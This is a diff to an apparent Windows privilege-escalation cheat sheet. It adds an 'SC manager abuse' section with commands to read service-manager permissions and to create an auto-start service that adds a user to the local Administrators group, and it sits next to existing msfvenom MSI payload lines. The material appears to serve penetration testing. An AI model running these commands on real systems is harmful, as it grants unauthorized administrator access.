@@ -12,6 +12,7 @@
     * [Insecure Service Executables](#Insecure-Service-Executables)
     * [DLL Hijacking](#DLL-Hijacking)
     * [Always Install Elevated](#Always-Install-Elevated)
+    * [SC manager abuse](#SC-manager-abuse)
   * [Registery](#Registery)
   * [Passwords](#Passwords)
   * [Scheduled tasks](#Scheduled-tasks)
@@ -472,6 +473,25 @@ msfvenom -p <PAYLOAD> lhost=<IP> -f msi -o setup.msi
   - Now build the project, which should produce an MSI at ```C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi```.
   - To remove the MSI afterwards, you can use ```msiexec /q /n /uninstall BeaconInstaller.msi``` before removing the file.
 
+### SC manager abuse
+#### Show permissions for service creation
+```
+sc sdshow scmanager
+```
+ 
+#### Convert permissions
+```
+$string = <PERMISSIONS>
+ConvertFrom-SddlString $string
+```
+
+#### Create service
+```
+sc create MyService displayName= "MyService" binPath= "C:\Windows\System32\net.exe localgroup Administrators <USER> /add" start= auto
+```
+
+#### Restart machine
+ 
 ## Registery
 ### Autoruns
 Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
